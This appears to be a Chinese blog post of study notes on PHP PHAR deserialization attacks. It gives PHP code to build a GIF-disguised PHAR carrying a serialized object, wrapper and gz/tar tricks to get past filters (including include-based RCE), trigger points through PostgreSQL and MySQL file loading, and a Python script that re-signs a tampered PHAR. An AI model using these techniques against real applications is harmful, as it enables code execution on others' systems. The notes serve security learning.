---
title: phar反序列化
pubDatetime: 2025-01-20T00:00:00.000+08:00
description: PHAR 文件构造、反序列化触发点与利用方式记录
tags:
  - php
---
## 创建phar

```php
<?php
class Test{
    public function __destruct(array $data){
        echo "unserialized";
    }
}

# set phar.readonly = Off in php.ini
@unlink("a.phar");
$phar = new Phar("a.phar");
$phar->startBuffering();
$phar->setStub("GIF89a__HALT_COMPILER();");  # 以__HALT_COMPILER();结尾
$o = new Test();
$phar->setMetadata($o);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
```
## 文件处理函数+phar伪协议触发

![](assets/phar反序列化/Pasted%20image%2020251217193938.png)

### 绕过phar协议开头限制

`compress.zlib://phar://phar.gif/test.txt`同样可以触发，同理`compress.bzip2://`也适用
注意，这里不需要实际压缩

### 绕过内容限制

压缩成**gz**后phar协议也能识别`phar://a.phar.gz/test.txt`
phar会先解压gz，这也导致了include可以直接包含这个gz文件造成rce

**tar**格式，压缩.phar/.metadata，序列化数据放在.metadata里
![](assets/phar反序列化/Pasted%20image%2020251217203337.png)
`phar://a.tar/`触发

## 其他触发点

```php
$pdo = new PDO("pgsql://...");
$pdo->pgsqlCopyFromFile("table1", "phar://a.phar/test.txt");
```

```php
mysqli_query($m, "LOAD DATA LOCAL INFILE 'phar://a.phar/test.txt' INTO TABLE users;");
```

实际上也是读文件触发


# phar文件验证与修复

php在打开phar文件时，会检验文件内容哈希与文件中存储的哈希是否一致，默认使用sha1

有的时候需要改phar中的内容，比如绕过wakeup，一种方法是使用**tar格式**，不需要验证。如果要用正常的phar文件，则需要修复phar的哈希值。

```python
import hashlib
with open('phar.phar', 'rb') as f:
    content = f.read()
text = content[:-28]
end = content[-8:]
sig = hashlib.sha1(text).digest()
with open('phar_new.phar', 'wb+') as f:
    f.write(text + sig + end)
```
